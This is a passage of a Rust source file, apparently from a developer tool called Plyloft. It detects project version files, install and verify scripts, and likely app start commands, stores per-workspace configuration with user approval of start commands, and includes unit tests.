                found.push(VersionFileEntry {
                    path: rel,
                    kind: VersionFileKind::PythonModuleVar,
                    variable_name: Some("version".to_string()),
                });
            }
        }
    }

    found
}

/// v1.13.0: locate the first occurrence of `<var_name>\s*=\s*"..."`
/// in `body` with word-boundary checks before AND after the
/// variable name. Returns the byte range of the value (between the
/// quotes) when found.
///
/// Word boundaries prevent matching `revision` when looking for
/// `version`. Indentation is ignored. Both top-level assignments
/// (`VERSION = "..."`) and keyword arguments inside function calls
/// (`FastAPI(version="...")`) match. Escaped quotes inside the
/// value (Python's `\"`) are honored.
pub fn find_var_in_text(body: &str, var_name: &str) -> Option<(usize, usize)> {
    let bytes = body.as_bytes();
    let var_bytes = var_name.as_bytes();
    if var_bytes.is_empty() {
        return None;
    }
    let mut i = 0;
    while i + var_bytes.len() <= bytes.len() {
        if &bytes[i..i + var_bytes.len()] == var_bytes {
            let before_ok = i == 0 || !is_ident_char(bytes[i - 1]);
            let after = i + var_bytes.len();
            let after_ok = after == bytes.len() || !is_ident_char(bytes[after]);
            if before_ok && after_ok {
                let mut j = after;
                while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                    j += 1;
                }
                if j < bytes.len() && bytes[j] == b'=' {
                    j += 1;
                    while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                        j += 1;
                    }
                    if j < bytes.len() && bytes[j] == b'"' {
                        let value_start = j + 1;
                        let mut k = value_start;
                        while k < bytes.len() {
                            if bytes[k] == b'\\' && k + 1 < bytes.len() {
                                k += 2;
                                continue;
                            }
                            if bytes[k] == b'"' {
                                return Some((value_start, k));
                            }
                            k += 1;
                        }
                    }
                }
            }
        }
        i += 1;
    }
    None
}

fn is_ident_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// v1.13.0: rewrite the first `<var_name> = "<old>"` occurrence in
/// `body` to `<var_name> = "<new_value>"`. Returns the modified
/// body when found; `None` when no match.
pub fn rewrite_var_in_text(
    body: &str,
    var_name: &str,
    new_value: &str,
) -> Option<String> {
    let (start, end) = find_var_in_text(body, var_name)?;
    let mut out = String::with_capacity(body.len() + new_value.len());
    out.push_str(&body[..start]);
    out.push_str(new_value);
    out.push_str(&body[end..]);
    Some(out)
}

fn detect_install_script(cwd: &Path) -> Option<String> {
    for candidate in [
        "scripts/install-local.sh",
        "scripts/install.sh",
        "install.sh",
    ] {
        if cwd.join(candidate).exists() {
            return Some(candidate.to_string());
        }
    }
    None
}

/// v1.13.5: detection still scans for shell-script verifies and
/// produces a 1-element `verify_pipeline` when found. SlashCommand
/// detection is deferred — no heuristic distinguishes "this project
/// uses /ppvp" from filesystem signals alone, so users add a
/// SlashCommand entry manually via the proposal-card edit.
pub(crate) fn detect_verify_pipeline(cwd: &Path) -> Option<Vec<VerifyKind>> {
    for candidate in [
        "scripts/ppvp.sh",
        "scripts/verify.sh",
        "scripts/test.sh",
    ] {
        if cwd.join(candidate).exists() {
            return Some(vec![VerifyKind::Script {
                path: candidate.to_string(),
            }]);
        }
    }
    None
}

// ── Try it: how the app starts (TRY_IT_SPEC §4.3) ─────────────────────

/// The package managers Try it knows, from the lockfile beside
/// `package.json`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum PackageManager {
    Npm,
    Pnpm,
    Yarn,
    Bun,
}

impl PackageManager {
    pub fn program(self) -> &'static str {
        match self {
            PackageManager::Npm => "npm",
            PackageManager::Pnpm => "pnpm",
            PackageManager::Yarn => "yarn",
            PackageManager::Bun => "bun",
        }
    }
}

/// What [`detect_try_command`] found, so the sheet can say where the
/// suggestion came from ("Found in package.json: the "dev" script, run with
/// npm."). Every `command` is stored as the person would type it; how
/// Windows runs it is the session's business, not this one's.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "camelCase", rename_all_fields = "camelCase")]
pub enum TryDetection {
    /// A `dev`, `start` or `preview` script of `package.json`.
    PackageScript {
        command: String,
        script: String,
        package_manager: PackageManager,
    },
    /// `manage.py` at the root: a Django project.
    Django { command: String },
    /// A `Gemfile` with `config.ru` or `bin/rails`: a Rails (or Rack) app.
    Rails { command: String },
    /// An `index.html` at the root and no `package.json`: a plain website,
    /// opened in the browser rather than started.
    StaticSite { file: String },
    /// Nothing Plyloft recognises: the person is asked.
    None,
}

impl TryDetection {
    /// The command it suggests; `None` for a static site or nothing found.
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn command(&self) -> Option<&str> {
        match self {
            TryDetection::PackageScript { command, .. }
            | TryDetection::Django { command }
            | TryDetection::Rails { command } => Some(command),
            TryDetection::StaticSite { .. } | TryDetection::None => None,
        }
    }
}

/// A `package.json` larger than this is not read for scripts.
const PACKAGE_JSON_MAX_BYTES: u64 = 4 * 1024 * 1024;

pub(crate) fn package_manager_of(root: &Path) -> PackageManager {
    if root.join("pnpm-lock.yaml").is_file() {
        PackageManager::Pnpm
    } else if root.join("yarn.lock").is_file() {
        PackageManager::Yarn
    } else if root.join("bun.lockb").is_file() || root.join("bun.lock").is_file() {
        PackageManager::Bun
    } else {
        PackageManager::Npm
    }
}

/// The `scripts` object of `package_json`, when it can be read (at most
/// [`PACKAGE_JSON_MAX_BYTES`], a byte-order mark allowed) and has one.
fn package_scripts(package_json: &Path) -> Option<serde_json::Map<String, serde_json::Value>> {
    if fs::metadata(package_json).ok()?.len() > PACKAGE_JSON_MAX_BYTES {
        return None;
    }
    let bytes = fs::read(package_json).ok()?;
    // Some Windows editors save JSON with a byte-order mark.
    let body = bytes.strip_prefix("\u{feff}".as_bytes()).unwrap_or(&bytes);
    let mut value: serde_json::Value = serde_json::from_slice(body).ok()?;
    match value.get_mut("scripts")?.take() {
        serde_json::Value::Object(map) => Some(map),
        _ => None,
    }
}

/// Try it walk fix (TRY_IT_SPEC §4.1): the body of the script `name` in the
/// `package.json` at the top of `root` — what a Try session's start command
/// runs, read so the session can pass a Vite or Astro server the card's
/// port. `None` when there is no such script (or no readable file).
pub fn package_script_body(root: &Path, name: &str) -> Option<String> {
    package_scripts(&root.join("package.json"))?
        .get(name)
        .and_then(serde_json::Value::as_str)
        .map(str::to_string)
}

/// The first of `dev`, `start`, `preview` that `package.json` defines as a
/// non-empty string. A file that can't be read or parsed has none.
fn package_script(package_json: &Path) -> Option<&'static str> {
    let scripts = package_scripts(package_json)?;
    ["dev", "start", "preview"].into_iter().find(|name| {
        scripts
            .get(*name)
            .and_then(serde_json::Value::as_str)
            .is_some_and(|body| !body.trim().is_empty())
    })
}

/// The Python a suggestion names. The backend decides, for the platform it
/// is built for: macOS and Linux ship `python3` (and often no `python`); on
/// Windows the python.org installer always installs the `py` launcher, while
/// `python` may be missing or open the Microsoft Store alias.
fn python_program() -> &'static str {
    if cfg!(windows) {
        "py"
    } else {
        "python3"
    }
}

/// Try it (TRY_IT_SPEC §4.3): how the app in `root` most likely starts.
/// Reads files only — never runs anything — and is called when the sheet
/// opens, not in the background. It suggests; the person confirms.
pub fn detect_try_command(root: &Path) -> TryDetection {
    let package_json = root.join("package.json");
    let has_package_json = package_json.is_file();
    if has_package_json {
        if let Some(script) = package_script(&package_json) {
            let pm = package_manager_of(root);
            let command = match script {
                "start" => format!("{} start", pm.program()),
                other => format!("{} run {other}", pm.program()),
            };
            return TryDetection::PackageScript {
                command,
                script: script.to_string(),
                package_manager: pm,
            };
        }
    }
    if root.join("manage.py").is_file() {
        return TryDetection::Django {
            command: format!("{} manage.py runserver", python_program()),
        };
    }
    if root.join("Gemfile").is_file() {
        // `ruby bin/rails` works where the script's shebang doesn't (Windows).
        if root.join("bin/rails").is_file() {
            return TryDetection::Rails {
                command: "ruby bin/rails server".to_string(),
            };
        }
        if root.join("config.ru").is_file() {
            return TryDetection::Rails {
                command: "bundle exec rackup".to_string(),
            };
        }
    }
    if !has_package_json && root.join("index.html").is_file() {
        return TryDetection::StaticSite {
            file: "index.html".to_string(),
        };
    }
    TryDetection::None
}

/// The most a start command may hold (it is typed, like a terminal line).
pub const MAX_TRY_COMMAND_CHARS: usize = 2_000;

/// The start command as it is stored: trimmed, `None` when empty. Refused
/// when it is over [`MAX_TRY_COMMAND_CHARS`] or spans several lines.
pub fn normalize_try_command(command: Option<String>) -> Result<Option<String>, String> {
    let Some(command) = command.map(|c| c.trim().to_string()).filter(|c| !c.is_empty()) else {
        return Ok(None);
    };
    if command.chars().count() > MAX_TRY_COMMAND_CHARS {
        return Err(format!("A start command is at most {MAX_TRY_COMMAND_CHARS} characters."));
    }
    if command.contains('\n') || command.contains('\r') {
        return Err("A start command is one line, as you'd type it in a terminal.".to_string());
    }
    Ok(Some(command))
}

/// What the How to start your app row and sheet show.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TryCommandView {
    /// The saved start command (`ProjectConfig::try_command`), if any.
    pub command: Option<String>,
    /// This Mac may run it without asking ([`crate::worktree_setup::try_allowed`]).
    pub approved: bool,
    /// It travels through the repository's shared definition (the
    /// definition carries build settings), so everyone who opens the repo
    /// gets it; otherwise it is this Mac's alone.
    pub shared: bool,
    /// Shared, and this Mac can't write the repository's definition.
    pub read_only: bool,
    /// This repository's build settings exist on this Mac. Without them the
    /// command is kept on this Mac until the first config takes it over.
    pub has_config: bool,
    /// What a read of the project folder suggests, read now.
    pub detection: TryDetection,
}

/// [`TryCommandView`] for a workspace whose project folder is `root`.
pub fn try_command_view(store: &ProjectConfigStore, workspace_id: &str, root: &Path) -> TryCommandView {
    let config = store.get(workspace_id);
    let command = store.try_command(workspace_id);
    let worktree = crate::worktree_setup::load_settings(store, workspace_id);
    let cache = crate::workspace_definition::load_cache(store, workspace_id);
    let shared = cache
        .as_ref()
        .and_then(|c| c.definition.as_ref())
        .is_some_and(|d| d.has_project());
    TryCommandView {
        approved: worktree.try_allowed(command.as_deref()),
        command,
        shared,
        read_only: shared && cache.as_ref().is_some_and(|c| c.write_access.read_only()),
        has_config: config.is_some(),
        detection: detect_try_command(root),
    }
}

/// Write the start command where it lives: this Mac's config, else
/// `try_command.json` until there is one (both atomic).
pub fn set_try_command(store: &ProjectConfigStore, workspace_id: &str, command: Option<String>) -> Result<(), String> {
    store.set_try_command_stored(workspace_id, command)
}

/// The save behind `project_try_command_save`: the command goes in through
/// `shared` (the app passes `workspace_definition::edit_shared`, which records
/// and publishes it, and refuses on a read-only repository after putting the
/// repository's value back); only once that succeeded does this Mac record
/// that it agrees to run it — a refused save never approves anything.
pub fn save_try_command(
    store: &ProjectConfigStore,
    workspace_id: &str,
    command: Option<String>,
    shared: impl FnOnce(&mut dyn FnMut() -> Result<(), String>) -> Result<(), String>,
) -> Result<(), String> {
    let mut edit = || set_try_command(store, workspace_id, command.clone());
    shared(&mut edit)?;
    let mut worktree = crate::worktree_setup::load_settings(store, workspace_id);
    worktree.approved_try = command;
    crate::worktree_setup::save_settings(store, workspace_id, &worktree)
}

/// Record that this Mac agrees to run `command` — only while it is still the
/// saved start command, so an approval never lands on a newer one it didn't see.
pub fn approve_try_command(store: &ProjectConfigStore, workspace_id: &str, command: &str) -> Result<(), String> {
    let saved = store.try_command(workspace_id);
    if saved.as_deref().map(str::trim) != Some(command.trim()) || command.trim().is_empty() {
        return Err("How your app starts changed since you looked. Look at it again before allowing it.".to_string());
    }
    let mut worktree = crate::worktree_setup::load_settings(store, workspace_id);
    worktree.approved_try = Some(command.trim().to_string());
    crate::worktree_setup::save_settings(store, workspace_id, &worktree)
}

pub fn detect_from_filesystem(cwd: &Path) -> ProjectConfigProposal {
    detect_with_branch(cwd, detect_target_branch(cwd), "from git HEAD")
}

/// OB-13: the same scan with the target branch already decided — Setup's
/// step 9 decides it without the silent `main` of [`detect_target_branch`]
/// (`project_setup_config::detect_for_setup`). `from` says where the branch
/// came from, for the notes.
pub fn detect_with_branch(cwd: &Path, target_branch: String, from: &str) -> ProjectConfigProposal {
    let mut notes: Vec<String> = Vec::new();
    notes.push(format!("target branch: {target_branch} ({from})"));

    let version_files = detect_version_files(cwd);
    if version_files.is_empty() {
        notes.push("no recognized version file found — manual entry needed".to_string());
    } else {
        notes.push(format!(
            "{} version file(s) detected: {}",
            version_files.len(),
            version_files
                .iter()
                .map(|v| v.path.as_str())
                .collect::<Vec<_>>()
                .join(", ")
        ));
    }

    let install_script = detect_install_script(cwd);
    if install_script.is_none() {
        notes.push("no install script found at standard paths".to_string());
    }
    let verify_pipeline = detect_verify_pipeline(cwd);
    if verify_pipeline.is_none() {
        notes.push("no verify script found at standard paths".to_string());
    }

    let has_claude_md = cwd.join("CLAUDE.md").exists();
    if has_claude_md {
        notes.push("CLAUDE.md found — agent-assisted refinement available later".to_string());
    }

    let now = now_millis();
    let config = ProjectConfig {
        schema_version: PROJECT_CONFIG_SCHEMA_VERSION,
        target_branch,
        version_files,
        install_script,
        try_command: None,
        verify_pipeline,
        verify_script: None,
        cache_paths: Vec::new(),
        shared_build_cache: true,
        self_check: true,
        review_checklist: Vec::new(),
        blocking_findings: Default::default(),
        created_at: now,
        updated_at: now,
    };

    ProjectConfigProposal {
        config,
        has_claude_md,
        notes,
    }
}

pub struct ProjectConfigStore {
    root: PathBuf,
    /// In-memory cache: workspaceId → config. Mirrors disk; saves
    /// write through. Same pattern as KanbanStore.
    cache: Mutex<HashMap<String, ProjectConfig>>,
}

/// 1.173.0 (B1): the config one area of the workspace ships with
/// (`areas::AreaConfig`): `None` without a config, as
/// [`ProjectConfigStore::get`].
/// - no `area_id` → `Implicit`, exactly `get`'s config, tagged `vX.Y.Z`
///   (a repository without areas, and every caller from before areas);
/// - a listed id → `Area`: its branch and version files, else the
///   workspace's;
/// - an id the repository doesn't list → `Unknown`;
/// - the repository's areas break the rules and this Mac has no good copy
///   → `Held`, whatever the id.
///
/// B3/B4 start, ship and release only on `Implicit` and `Area`, and refuse
/// on `Unknown` and `Held` — never falling back to the implicit area.
pub fn config_for(
    store: &ProjectConfigStore,
    workspace_id: &str,
    area_id: Option<&str>,
) -> Option<crate::areas::AreaConfig> {
    let config = store.get(workspace_id)?;
    if let Some(problem) = crate::areas::held(store, workspace_id) {
        return Some(crate::areas::AreaConfig::Held { problem });
    }
    Some(crate::areas::resolve_config(
        &config,
        &crate::areas::for_workspace(store, workspace_id),
        area_id,
    ))
}

impl ProjectConfigStore {
    pub fn new(config_dir: PathBuf) -> Result<Self, String> {
        let root = config_dir.join(PROJECTS_SUBDIR);
        fs::create_dir_all(&root).map_err(|e| format!("create projects dir: {e}"))?;
        Ok(Self {
            root,
            cache: Mutex::new(HashMap::new()),
        })
    }

    /// Per-workspace dir. Hosts `config.json` plus future per-project
    /// artifacts (`intake.md` in v1.12.3, etc.).
    /// `<config_dir>/projects` — where every workspace's own directory is.
    /// GH #104: the Inbox reads each workspace's improvement proposal from under
    /// it, and needs the root rather than one workspace's directory.
    pub fn root(&self) -> &Path {
        &self.root
    }

    pub fn workspace_dir(&self, workspace_id: &str) -> PathBuf {
        self.root.join(workspace_id)
    }

    /// G5 (Challenger 2): a workspace's target branch read straight from
    /// its `config.json` under `root` ([`Self::root`]) — for the Inbox,
    /// which has the root, not the store. `None` without a config.
    pub fn target_branch_in(root: &Path, workspace_id: &str) -> Option<String> {
        let bytes = fs::read(root.join(workspace_id).join(CONFIG_FILENAME)).ok()?;
        let cfg: ProjectConfig = serde_json::from_slice(&bytes).ok()?;
        Some(cfg.target_branch).filter(|b| !b.trim().is_empty())
    }

    fn config_path(&self, workspace_id: &str) -> PathBuf {
        self.workspace_dir(workspace_id).join(CONFIG_FILENAME)
    }

    fn review_path(&self, workspace_id: &str) -> PathBuf {
        self.workspace_dir(workspace_id).join(REVIEW_FILENAME)
    }

    fn try_path(&self, workspace_id: &str) -> PathBuf {
        self.workspace_dir(workspace_id).join(TRY_FILENAME)
    }

    /// Try it: the start command this Mac runs with — from its config, else
    /// from `try_command.json` (kept while there is no config yet).
    pub fn try_command(&self, workspace_id: &str) -> Option<String> {
        match self.get(workspace_id) {
            Some(cfg) => cfg.try_command,
            None => self.stored_try_command(workspace_id),
        }
    }

    fn stored_try_command(&self, workspace_id: &str) -> Option<String> {
        #[derive(Deserialize)]
        #[serde(rename_all = "camelCase")]
        struct Stored {
            #[serde(default, deserialize_with = "lenient_opt")]
            try_command: Option<String>,
        }
        fs::read(self.try_path(workspace_id))
            .ok()
            .and_then(|bytes| serde_json::from_slice::<Stored>(&bytes).ok())
            .and_then(|s| s.try_command)
            .filter(|c| !c.trim().is_empty())
    }

    /// Write the start command into the config when there is one, else into
    /// `try_command.json` (atomically; `None` removes the file).
    pub(crate) fn set_try_command_stored(&self, workspace_id: &str, command: Option<String>) -> Result<(), String> {
        if let Some(mut cfg) = self.get(workspace_id) {
            cfg.try_command = command;
            return self.set(workspace_id, cfg);
        }
        let path = self.try_path(workspace_id);
        match command {
            None => match fs::remove_file(&path) {
                Ok(()) => Ok(()),
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
                Err(e) => Err(format!("remove {TRY_FILENAME}: {e}")),
            },
            Some(command) => crate::atomic::write_atomic_json(
                &path,
                &serde_json::json!({ "tryCommand": command }),
            ),
        }
    }

    /// ADR 0006 (third card): the workspace's review settings — from its
    /// config, else from `review.json`, else the defaults (on, no classes).
    pub fn review(&self, workspace_id: &str) -> ReviewSettings {
        if let Some(cfg) = self.get(workspace_id) {
            return ReviewSettings {
                self_check: cfg.self_check,
                review_checklist: cfg.review_checklist,
                blocking_findings: cfg.blocking_findings,
            };
        }
        fs::read(self.review_path(workspace_id))
            .ok()
            .and_then(|bytes| serde_json::from_slice(&bytes).ok())
            .unwrap_or_default()
    }

    /// Write the review settings where they live: into the config when
    /// there is one, else `review.json` (atomically).
    pub(crate) fn set_review_settings(&self, workspace_id: &str, review: &ReviewSettings) -> Result<(), String> {
        if let Some(mut cfg) = self.get(workspace_id) {
            cfg.self_check = review.self_check;
            cfg.review_checklist = review.review_checklist.clone();
            cfg.blocking_findings = review.blocking_findings;
            return self.set(workspace_id, cfg);
        }
        let dir = self.workspace_dir(workspace_id);
        fs::create_dir_all(&dir).map_err(|e| format!("create workspace dir: {e}"))?;
        let path = self.review_path(workspace_id);
        let bytes = serde_json::to_vec_pretty(review).map_err(|e| format!("encode: {e}"))?;
        let tmp = path.with_extension("json.tmp");
        fs::write(&tmp, &bytes).map_err(|e| format!("write tmp: {e}"))?;
        crate::platform::rename(&tmp, &path).map_err(|e| format!("rename: {e}"))
    }

    /// A whole config from Detect, a template or the proposal editor: it
    /// carries no review settings of its own (the proposal shows none), so
    /// the workspace's current ones are kept — GH #111 F29.
    pub fn set_keeping_review(&self, workspace_id: &str, mut config: ProjectConfig) -> Result<(), String> {
        // Try it: a whole config without a start command (Detect, a template,
        // an explicit `null`) keeps the one saved — in the config, or the one
        // kept before there was any; `project_try_command_save` owns clearing.
        if config.try_command.is_none() {
            config.try_command = self.try_command(workspace_id);
        }
        let review = self.review(workspace_id);
        config.self_check = review.self_check;
        config.review_checklist = review.review_checklist;
        config.blocking_findings = review.blocking_findings;
        self.set(workspace_id, config)
    }

    /// Read the config for a workspace. Returns `None` when no config
    /// has been created yet — callers must decide whether to fall back
    /// to hardcoded defaults (the v1.12.x interim state) or to refuse
    /// the operation (post-v1.12.x state).
    pub fn get(&self, workspace_id: &str) -> Option<ProjectConfig> {
        if let Some(cfg) = self.cache.lock().get(workspace_id) {
            return Some(cfg.clone());
        }
        let path = self.config_path(workspace_id);
        let bytes = fs::read(&path).ok()?;
        let mut cfg: ProjectConfig = serde_json::from_slice(&bytes).ok()?;
        if cfg.schema_version > PROJECT_CONFIG_SCHEMA_VERSION {
            log::warn!(
                "project_config: workspace {workspace_id} has version {} (expected ≤{}); ignoring",
                cfg.schema_version,
                PROJECT_CONFIG_SCHEMA_VERSION
            );
            return None;
        }
        // v1 → v2 (v1.13.5): translate legacy `verify_script` to a
        // 1-element `verify_pipeline` of `Script` shape. The disk
        // file is rewritten on the next `set()`; we don't force a
        // write-back here to keep `get()` non-mutating.
        if cfg.schema_version < PROJECT_CONFIG_SCHEMA_VERSION {
            if cfg.verify_pipeline.is_none() {
                if let Some(path) = cfg.verify_script.take() {
                    cfg.verify_pipeline = Some(vec![VerifyKind::Script { path }]);
                }
            } else {
                cfg.verify_script = None;
            }
            cfg.schema_version = PROJECT_CONFIG_SCHEMA_VERSION;
            log::info!(
                "project_config: migrated workspace {workspace_id} v1 → v{} (verify_script → verify_pipeline)",
                PROJECT_CONFIG_SCHEMA_VERSION
            );
        }
        self.cache
            .lock()
            .insert(workspace_id.to_string(), cfg.clone());
        Some(cfg)
    }

    /// The project's extra build-cache paths for prunes and trash GC
    /// (`ProjectConfig::cache_paths`); empty without a config.
    pub fn cache_paths(&self, workspace_id: &str) -> Vec<String> {
        self.get(workspace_id).map(|c| c.cache_paths).unwrap_or_default()
    }

    /// Whether card Builder/Verify sessions share one Cargo target
    /// (`ProjectConfig::shared_build_cache`); on without a config.
    pub fn shared_build_cache(&self, workspace_id: &str) -> bool {
        self.get(workspace_id).is_none_or(|c| c.shared_build_cache)
    }

    /// Persist the config atomically. Stamps `updated_at` and (if not
    /// already set) `created_at`.
    pub fn set(&self, workspace_id: &str, mut config: ProjectConfig) -> Result<(), String> {
        let now = now_millis();
        if config.created_at == 0 {
            config.created_at = now;
        }
        config.updated_at = now;
        if config.schema_version == 0 {
            config.schema_version = PROJECT_CONFIG_SCHEMA_VERSION;
        }

        let dir = self.workspace_dir(workspace_id);
        fs::create_dir_all(&dir).map_err(|e| format!("create workspace dir: {e}"))?;
        let path = self.config_path(workspace_id);
        let bytes = serde_json::to_vec_pretty(&config).map_err(|e| format!("encode: {e}"))?;
        let tmp = path.with_extension("json.tmp");
        fs::write(&tmp, &bytes).map_err(|e| format!("write tmp: {e}"))?;
        crate::platform::rename(&tmp, &path).map_err(|e| format!("rename: {e}"))?;
        self.cache
            .lock()
            .insert(workspace_id.to_string(), config);
        // The config now holds the review settings (`set_keeping_review`
        // took them over, or the repository's definition set them), and the
        // start command too (taken over the same way, or the repository's).
        let _ = fs::remove_file(self.review_path(workspace_id));
        let _ = fs::remove_file(self.try_path(workspace_id));
        Ok(())
    }

    /// v1.18.0 (Cycle E3): stamp a builtin starter-pack template onto a
    /// workspace. Returns the persisted config. Errors if `template_id`
    /// doesn't match any builtin.
    pub fn apply_template(
        &self,
        workspace_id: &str,
        template_id: &str,
    ) -> Result<ProjectConfig, String> {
        let template = builtin_templates()
            .into_iter()
            .find(|t| t.id == template_id)
            .ok_or_else(|| format!("template `{template_id}` not found"))?;
        // `set` rewrites created_at (when 0) and updated_at to now —
        // we lean on that instead of duplicating timestamp logic here.
        self.set_keeping_review(workspace_id, template.config)?;
        self.get(workspace_id)
            .ok_or_else(|| "applied template but config readback failed".to_string())
    }

    /// Remove a workspace's project config (and the workspace subdir
    /// in its entirety, including any future intake.md / etc.).
    /// Idempotent — missing dir is not an error.
    pub fn delete(&self, workspace_id: &str) -> Result<(), String> {
        let dir = self.workspace_dir(workspace_id);
        if dir.exists() {
            fs::remove_dir_all(&dir).map_err(|e| format!("remove workspace dir: {e}"))?;
        }
        self.cache.lock().remove(workspace_id);
        Ok(())
    }

    /// Remove a workspace's project config and every other per-project file
    /// except `keep` (file names in the workspace dir). GH #79: a Reset keeps
    /// the shared definition cache, which may hold pending edits.
    pub fn delete_keeping(&self, workspace_id: &str, keep: &[&str]) -> Result<(), String> {
        let dir = self.workspace_dir(workspace_id);
        if let Ok(entries) = fs::read_dir(&dir) {
            for entry in entries.filter_map(|r| r.ok()) {
                let name = entry.file_name();
                if keep.iter().any(|k| name == *k) {
                    continue;
                }
                let path = entry.path();
                let removed = if path.is_dir() {
                    fs::remove_dir_all(&path)
                } else {
                    fs::remove_file(&path)
                };
                removed.map_err(|e| format!("remove {path:?}: {e}"))?;
            }
        }
        self.cache.lock().remove(workspace_id);
        Ok(())
    }

    /// Enumerate every workspace that has a config on disk. Used by
    /// the FE settings panel to list managed projects.
    pub fn list(&self) -> Vec<(String, ProjectConfig)> {
        let entries = match fs::read_dir(&self.root) {
            Ok(e) => e,
            Err(_) => return Vec::new(),
        };
        let mut out = Vec::new();
        for entry in entries.filter_map(|r| r.ok()) {
            if !entry.path().is_dir() {
                continue;
            }
            let ws_id = match entry.file_name().into_string() {
                Ok(s) => s,
                Err(_) => continue,
            };
            if let Some(cfg) = self.get(&ws_id) {
                out.push((ws_id, cfg));
            }
        }
        out.sort_by(|a, b| a.0.cmp(&b.0));
        out
    }

    /// v1.12.0 bootstrap: for any workspace that looks like the Atelier
    /// repo and doesn't yet have a config, write
    /// `default_atelier_config()`. Idempotent. Logs each write.
    /// Best-effort — failures only warn (non-Atelier workspaces are
    /// skipped silently).
    pub fn bootstrap_atelier_workspaces(
        &self,
        workspaces: &[(String, PathBuf)],
    ) {
        for (ws_id, cwd) in workspaces {
            if !looks_like_atelier(cwd) {
                continue;
            }
            if self.get(ws_id).is_some() {
                continue;
            }
            let cfg = default_atelier_config();
            // GH #111 F31: review settings saved before any config are kept.
            match self.set_keeping_review(ws_id, cfg) {
                Ok(()) => log::info!(
                    "project_config: bootstrapped Atelier workspace {ws_id} with default config"
                ),
                Err(e) => log::warn!(
                    "project_config: bootstrap of Atelier workspace {ws_id} failed: {e}"
                ),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    /// A read-only shared repository has no Re-detect button: the refusal
    /// names who can set it up, and offers no `Set up` (no SET_UP_TODO).
    #[test]
    fn not_set_up_says_write_access_when_the_settings_are_read_only() {
        let writable = not_set_up("Atelier", false, false, "Nothing was shipped.", "ship again");
        assert!(writable.starts_with("Atelier isn't set up") && writable.contains(SET_UP_TODO));
        let read_only = not_set_up("Atelier", true, false, "Nothing was shipped.", "ship again");
        assert!(!read_only.contains(SET_UP_TODO), "{read_only}");
        assert!(read_only.contains("someone with write access has to press Re-detect"));
        assert!(read_only.ends_with("then ship again."));
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        assert!(!shared_read_only(&store, "ws"), "no shared definition, nothing read-only");
    }

    /// OB-15 (onboarding §9.1): while Setup isn't finished the refusal says
    /// "or finish setup"; once a project has a config it doesn't, and a
    /// read-only repository never does.
    #[test]
    fn not_set_up_says_or_finish_setup_only_while_setup_is_unfinished() {
        let unfinished = not_set_up("Atelier", false, true, "Nothing was started.", "start the card again");
        assert_eq!(
            unfinished,
            format!(
                "Atelier isn't set up for Plyloft's builds yet, so Plyloft doesn't know which branch to \
                 work from. Nothing was started. {SET_UP_TODO}, or finish setup, then start the card again."
            )
        );
        let finished = not_set_up("Atelier", false, false, "Nothing was started.", "start the card again");
        assert!(!finished.contains("finish setup"), "{finished}");
        assert!(finished.ends_with(&format!("{SET_UP_TODO}, then start the card again.")));
        let read_only = not_set_up("Atelier", true, true, "Nothing was shipped.", "ship again");
        assert!(!read_only.contains("finish setup"), "{read_only}");
    }

    /// Setup's `project` item: missing until one workspace has a config.
    #[test]
    fn setup_unfinished_until_a_project_has_a_config() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().join("cfg")).unwrap();
        let workspaces = crate::workspace::WorkspaceStore::new(tmp.path().join("ws")).unwrap();
        assert!(setup_unfinished(&store, &workspaces), "no config at all");
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        let ws = workspaces
            .create("repo".into(), repo.to_string_lossy().to_string())
            .unwrap();
        // Challenger P3-2: a config whose workspace is gone is not a project.
        store.set("removed-ws", default_atelier_config()).unwrap();
        assert!(setup_unfinished(&store, &workspaces), "only an orphaned config");
        store.set(&ws.id, default_atelier_config()).unwrap();
        assert!(!setup_unfinished(&store, &workspaces), "one project has its config");
    }

    /// v1.154.1 (K1): a workspace with no config refuses a card start in
    /// the start's own words; one with a config doesn't.
    #[test]
    fn card_start_refusal_until_the_workspace_has_a_config() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().join("cfg")).unwrap();
        let workspaces = crate::workspace::WorkspaceStore::new(tmp.path().join("ws")).unwrap();
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        let ws = workspaces
            .create("Sandbox".into(), repo.to_string_lossy().to_string())
            .unwrap();
        let refusal = card_start_refusal(&store, &workspaces, &ws.id).expect("refused");
        assert!(refusal.starts_with("Sandbox isn't set up for Plyloft's builds yet"), "{refusal}");
        assert!(refusal.contains(SET_UP_TODO) && refusal.ends_with("then start the card again."));
        store.set(&ws.id, default_atelier_config()).unwrap();
        assert_eq!(card_start_refusal(&store, &workspaces, &ws.id), None);
    }

    // ── v1.18.0 (Cycle E3): builtin template tests ─────────────

    #[test]
    fn builtin_templates_have_unique_ids() {
        let templates = builtin_templates();
        assert_eq!(templates.len(), 5);
        let mut ids: Vec<String> =
            templates.iter().map(|t| t.id.clone()).collect();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), 5, "template ids must be unique");
    }

    #[test]
    fn builtin_templates_round_trip_through_serde() {
        // Each template's config must encode + decode cleanly. Otherwise
        // applying it would error at the `set` step.
        for t in builtin_templates() {
            let bytes = serde_json::to_vec(&t.config).expect("encode");
            let decoded: ProjectConfig =
                serde_json::from_slice(&bytes).expect("decode");
            assert_eq!(
                decoded.target_branch, t.config.target_branch,
                "template `{}` failed round-trip on target_branch",
                t.id
            );
            assert_eq!(
                decoded.version_files.len(),
                t.config.version_files.len(),
                "template `{}` failed round-trip on version_files length",
                t.id
            );
        }
    }

    #[test]
    fn builtin_templates_each_have_a_verify_pipeline() {
        // v1: every template ships with a non-empty verify_pipeline so a
